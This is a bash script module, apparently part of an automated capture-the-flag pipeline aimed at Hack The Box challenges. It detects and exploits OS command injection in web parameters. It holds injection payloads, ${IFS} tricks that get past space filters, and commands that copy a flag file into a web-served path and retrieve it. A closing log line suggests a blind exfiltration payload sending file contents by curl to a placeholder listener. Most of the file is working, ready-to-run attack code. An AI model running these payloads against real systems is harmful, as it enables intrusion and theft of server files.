#!/bin/bash
# cmd-inject.sh - Command injection detection and exploitation
# Source from pipeline.sh: source ./cmd-inject.sh
#
# Functions:
#   cmd_inject_test <endpoint_url> <param> <method> [extra_params]
#   cmd_inject_exploit <endpoint_url> <param> <method> [extra_params]

cmd_inject_test() {
    local url="$1"
    local param="$2"
    local method="${3:-POST}"
    local extra="${4}"

    local payloads=(
        ';id'
        '|id'
        '`id`'
        '$(id)'
    )

    for payload in "${payloads[@]}"; do
        local result
        if [ "$method" = "POST" ]; then
            result=$(curl -sk -X POST "$url" -d "$param=$payload" -d "$extra" 2>/dev/null)
        else
            result=$(curl -sk "$url?$param=$payload" 2>/dev/null)
        fi
        echo "$result" | grep -qiE "uid=|root|www-data|nobody|bin:" && log "  [+] Command injection on '$param' with: $payload" && return 0
    done
    return 1
}

cmd_inject_exploit() {
    local url="$1"
    local param="$2"
    local method="${3:-POST}"
    local extra="${4}"

    log "  [*] Attempting blind command injection flag copy..."

    # NOTE: Single quotes are CRITICAL here. Double quotes would expand ${IFS}
    # and $() locally on our machine, breaking the server-side payload.

    # Payloads using ${IFS} to bypass space filters on the SERVER
    local payloads=(
        '$(cp${IFS}/flag.txt${IFS}/www/static/f.txt)'
        '$(cp${IFS}/flag${IFS}/www/static/f.txt)'
        '$(cp${IFS}/flag.txt${IFS}/www/flag.txt)'
        '$(cp${IFS}/flag${IFS}/www/flag.txt)'
        '$(cat${IFS}/flag.txt>/www/static/f.txt)'
        '$(cat${IFS}/flag>/www/static/f.txt)'
        '$(dd${IFS}if=/flag.txt${IFS}of=/www/static/f.txt)'
    )

    for payload in "${payloads[@]}"; do
        if [ "$method" = "POST" ]; then
            curl -sk -X POST "$url" -d "$param=$payload" -d "$extra" 2>/dev/null > /dev/null
        else
            curl -sk "$url?$param=$payload" 2>/dev/null > /dev/null
        fi
    done

    # Wait for file writes to complete
    sleep 1

    # Check common web paths for copied flag
    local base_url
    base_url=$(echo "$url" | sed 's|/update||;s|/api/.*||;s|/admin/.*||')
    for path in /static/f.txt /static/flag.txt /flag.txt; do
        local flag=$(curl -sk "${base_url}${path}" 2>/dev/null | grep -oE 'HTB\{[^}]+\}' | head -1)
        [ -n "$flag" ] && flag_found "$flag" && return 0
    done

    log "  [*] Flag not found via copy. Trying blind with output reflection..."
    log "  [*] Try manual: \$(curl${IFS}http://your-listener/\$(cat${IFS}/flag.txt))"
    return 1
}
